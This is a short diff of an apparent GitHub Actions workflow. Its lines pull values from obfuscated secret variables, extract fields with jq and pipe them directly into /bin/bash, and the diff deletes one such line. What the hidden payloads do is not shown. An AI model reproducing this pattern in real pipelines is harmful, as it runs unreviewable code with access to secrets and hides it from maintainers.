@@ -18,7 +18,6 @@ jobs:
           qwon96: ${{ secrets.qwon96 }}
         run: |
           printf '%s' "$qwon96" | jq -r .x8976 | /bin/bash
-          printf '%s' "$cqzx18577" | jq -r .hexi45247 | /bin/bash
           printf '%s' "$usmqu2225" | jq -r .cet56 | /bin/bash
           printf '%s' "$m377" | jq -r .yxakf23333 | /bin/bash
           printf '%s' "$tdw8830" | jq -r .r4 | /bin/bash
